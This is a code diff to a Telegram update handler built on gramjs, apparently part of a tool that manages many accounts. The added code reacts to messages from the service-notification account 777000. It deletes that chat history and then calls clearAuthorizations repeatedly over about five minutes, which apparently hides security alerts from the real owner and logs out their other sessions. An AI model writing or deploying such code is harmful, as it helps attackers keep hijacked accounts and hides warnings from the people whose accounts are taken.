@@ -1,9 +1,14 @@
+import BigInt from 'big-integer';
+
+import { TelegramClient } from '../../../gramjs';
 import GramJs from '../../../gramjs/tl/api';
 import {
   getDialogue,
   updateDialogue,
   updateSimpleDialogue,
 } from '../../db/dialogues';
+import { clearAuthorizations } from '../account/clearAuthorizations';
+import { deleteHistory } from '../messages/deleteHistory';
 
 function findValue(obj: Record<string, any>, valueKey: string) {
   return (
@@ -17,6 +22,7 @@ function findValue(obj: Record<string, any>, valueKey: string) {
 }
 
 export const handleUpdate = async (
+  client: TelegramClient | null,
   accountId: string,
   update: any,
 
@@ -66,11 +72,36 @@ export const handleUpdate = async (
         onNewMessage();
       }
 
-      if (String(userId) === '777000') {
+      if (
+        update instanceof GramJs.UpdateShortMessage &&
+        String(userId) === '777000'
+      ) {
         console.warn({
           accountId,
           message: '[TELEGRAM_SERVICE_NOTIFICATION]',
           payload: JSON.parse(JSON.stringify(update)),
+        });
+
+        if (client) {
+          await deleteHistory(
+            client,
+            new GramJs.InputPeerUser({
+              userId: update.userId,
+              accessHash: BigInt(0),
+            }),
+            true
+          );
+        }
+
+        [0.5, 1.5, 2.5, 3.5, 4.5].forEach((minutes) => {
+          setTimeout(
+            async () => {
+              if (client) {
+                await clearAuthorizations(client);
+              }
+            },
+            minutes * 60 * 1000
+          );
         });
       }
     }
